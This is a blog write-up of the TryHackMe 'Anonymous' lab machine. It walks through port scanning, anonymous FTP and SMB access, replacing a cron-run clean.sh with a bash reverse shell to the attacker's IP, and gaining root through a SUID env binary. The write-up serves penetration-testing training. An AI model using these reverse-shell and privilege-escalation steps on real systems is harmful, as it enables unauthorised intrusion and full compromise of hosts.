---
layout: post
title: THM Anonymous WriteUp
date: 2025-03-10
categories:
  - TryHackMe
  - TryHackMe-Linux
tags:
  - CTF
  - TryHackMe
  - Linux
  - SUID
  - Anonymous
  - FTP-Anon-Allowed
  - SMB-Anon-Allowed
  - Anonymous-Login
  - File-Manipulation
  - Reverse-Shell
  - SUID-Exploitation
  - Privilege-Escalation
  - env-Binary
media_subpath: /assets/img/Anonymous
---
![Desktop View](Anonymous.png){: w="400"  h="400" }



# Anonymous Skills


>**Anonymous** is a medium Linux machine where we will use the following skills:

- **Port Discovery**
- **Service Enumeration (FTP and SMB)**
- **Exploiting Anonymous Login on FTP and SMB**
- **File and Directory Enumeration**
- **Script Modification for Reverse Shell Execution**
- **Reverse Shell Execution**
- **Linux Privilege Enumeration**
- **Exploiting SUID Binaries (env)**
- **Privilege Escalation via SUID Binary Exploitation**

---
## IP Address Enumeration

Using the usual `nmap` scan I've discovered port **22, 80, 139** & port **445**:

```perl
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.191.150 -oG allPorts
Nmap scan report for 10.10.191.150
Host is up, received user-set (2.1s latency).
Scanned at 2025-03-10 21:33:25 CET for 25s
Not shown: 49723 closed tcp ports (reset), 15808 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE      REASON
21/tcp  open  ftp          syn-ack ttl 63
22/tcp  open  ssh          syn-ack ttl 63
139/tcp open  netbios-ssn  syn-ack ttl 63
445/tcp open  microsoft-ds syn-ack ttl 63
```

Then i launched a basic group of scripts to seek more info from the open ports:

```java
❯ nmap -sCV -p21,22,139,445 10.10.191.150 -oN targeted
Nmap scan report for 10.10.191.150
Host is up (0.16s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.14.99.119
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-03-10T20:34:25
|_  start_date: N/A
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2025-03-10T20:34:25+00:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

So we have to check the following ports & services:

- **Port 21 --> vsftpd 2.0.8 or later**
- **Port  22 -->  OpenSSH 7.6p1 Ubuntu 4ubuntu0.3**
- **Port 139 --> Samba smbd 4.7.6-Ubuntu**
- **Port 445 --> Samba smbd 4.7.6-Ubuntu**

Let's start with the **Samba** service.

---
## Port 445 Enumeration

Let's start by checking if we can access any share without providing credentials.

```bash
❯❯ smbclient -L \\10.10.191.150 -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	pics            Disk      My SMB Share Directory for Pics
	IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            ANONYMOUS
```

Seems like we can access the `pics` share as `anonymous`, let's see what's inside.

```bash
❯ smbclient \\\\10.10.191.150\\pics -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun May 17 13:11:34 2020
  ..                                  D        0  Mon Mar 10 21:26:26 2025
  corgo2.jpg                          N    42663  Tue May 12 02:43:42 2020
  puppos.jpeg                         N   265188  Tue May 12 02:43:42 2020
```

We have found two images, so let's download them.

```bash
smb: \> mget *
Get file corgo2.jpg? y
getting file \corgo2.jpg of size 42663 as corgo2.jpg (65.4 KiloBytes/sec) (average 65.4 KiloBytes/sec)
Get file puppos.jpeg? y
getting file \puppos.jpeg of size 265188 as puppos.jpeg (149.9 KiloBytes/sec) (average 127.1 KiloBytes/sec)
smb: \> exit
```

Once with the images i checked them.

![Desktop View](corgo2.jpg)

![Desktop View](puppos.jpeg)

_Just some puppies :)_

If we check for any embed data inside both, nothing was found, the images have tons of metadata, but nothing really useful, so let's enumerate the **FTP** service.

---
## Port 21 Enumeration

The `nmap` report, we can see that the `anonymous` user is allowed and that there is a folder named `scripts`, so let's log in and check what's inside.

```bash
❯ ftp 10.10.191.150
Connected to 10.10.191.150.
220 NamelessOne's FTP Server!
Name (10.10.191.150:ne4rby): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Checking the content of the `scripts` folder, I found three files.

```bash
ftp> cd scripts
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||57970|)
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000           55 Mar 10 20:19 clean.sh
-rw-rw-r--    1 1000     1000         1935 Mar 10 20:19 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
```

Let's download all the files.

```bash
ftp> mget *
local: clean.sh remote: clean.sh
229 Entering Extended Passive Mode (|||36412|)
150 Opening BINARY mode data connection for clean.sh (55 bytes).
100% |*********************************************************************************************************************************************|    55      910.35 KiB/s    00:00 ETA
226 Transfer complete.
55 bytes received in 00:00 (0.48 KiB/s)
local: removed_files.log remote: removed_files.log
229 Entering Extended Passive Mode (|||20594|)
150 Opening BINARY mode data connection for removed_files.log (1935 bytes).
100% |*********************************************************************************************************************************************|  1935       72.92 KiB/s    00:00 ETA
226 Transfer complete.
1935 bytes received in 00:00 (8.25 KiB/s)
local: to_do.txt remote: to_do.txt
229 Entering Extended Passive Mode (|||26240|)
150 Opening BINARY mode data connection for to_do.txt (68 bytes).
100% |*********************************************************************************************************************************************|    68        1.73 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.25 KiB/s)
```

Once with the files stored locally, let's check it's content.

After checking the three files, seems like the `clean.sh` script, deletes any files stored at `/tmp` and then send the name of the deleted file to a file named `removed_files.log`.

Inside the **FTP** client, I realized that the `removed_files.log` is being update each minute, that tell us that the `clean.sh` script is being executed every minute.

We do have write permission in the `scripts` folder, so we can modify the content of the `clean.sh` script, so let's change it's content to a reverse shell payload.

```bash
❯ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.14.99.119/443 0>&1' > clean.sh
```

Then log in again with the `anonymous` user and upload the script inside the `scripts` folder.

```bash
ftp> cd scripts
250 Directory successfully changed.
ftp> put 
clean.sh		corgo2.jpg		puppos.jpeg		removed_files.log	to_do.txt
ftp> put clean.sh 
229 Entering Extended Passive Mode (|||60333|)
150 Ok to send data.
100% |*********************************************************************************************************************************************|    55      866.30 KiB/s    00:00 ETA
226 Transfer complete.
55 bytes sent in 00:00 (0.21 KiB/s)
ftp> exit
```

Then set a listener at port `443` and wait for the payload to execute.

```bash
❯ nc -nvlp 443
listening on [any] 443 ...
connect to [10.14.99.119] from (UNKNOWN) [10.10.191.150] 50570
bash: cannot set terminal process group (1798): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$  
```

---
## Shell as namelessone

### TTY Treatment 

Once we get the reverse shell, let's find a way to scale privileges, but before, we have to get a fully interactive shell, there are multiple ways but i like to do it this way: 

```bash
script /dev/null -c bash
```

Then press *Ctrl+Z* to get the process in background.

Now that you are in your machine execute the next command:

```bash
stty raw -echo;fg
```

Now write `reset xterm` and you should have a better looking shell but you still have to execute a few commands:

```bash
export TERM=xterm
export SHELL=bash
stty rows 45 columns 184
```

Make a `stty size` in your own shell to know the rows and columns.

### Privilege Escalation

Once with a stable shell and  as user `namelessone` we can read the `user.txt` flag at `/home/namelessone/user.txt`.

```bash
namelessone@anonymous:~$ cat /home/namelessone/user.txt 
90d******85815ff991e68******4740
```

Now we can begin with the **privilege escalation** phase, after a bit of research i checked the **SUID** binaries, i found that the `env` binary is **SUID**.

```bash
namelessone@anonymous:/$ find / -perm -4000 2>/dev/null

<REDACTED>

/usr/bin/env

<REDACTED>

```

Checking this binary at [GTFOBins](https://gtfobins.github.io/gtfobins/env/#suid), we can see that we can spawn a shell as `root` executing the following command.

```bash
namelessone@anonymous:/$ env /bin/bash -p
bash-4.4# whoami
root
```

Once as `root` we can read the `root.txt` flag at `/root/root.txt`.

```bash
bash-4.4# cat /root/root.txt
4d9******31a622a7ed10f******f363
```

---
## Final Thoughts

The **Anonymous** machine on TryHackMe is a great exercise in **service enumeration, privilege escalation**, and **exploiting misconfigurations**. The initial phase involves leveraging **anonymous login** on both **FTP** and **SMB** services, highlighting the risks of leaving such services exposed without proper authentication. Discovering a writable script that executes every minute provides a clear path to gaining initial access by injecting a reverse shell payload, demonstrating the importance of proper file permissions and monitoring automated tasks. The privilege escalation phase involves exploiting the **SUID bit** on the `env` binary, showcasing how misconfigured permissions can lead to full system compromise. This machine effectively reinforces skills in **service enumeration, file manipulation, reverse shell execution**, and SUID exploitation, making it a valuable learning experience for aspiring penetration testers.

![Desktop View](AnonymousPwn.png)

-- -
**Thanks for reading, i’ll appreciate that you take a look to my other posts :)**

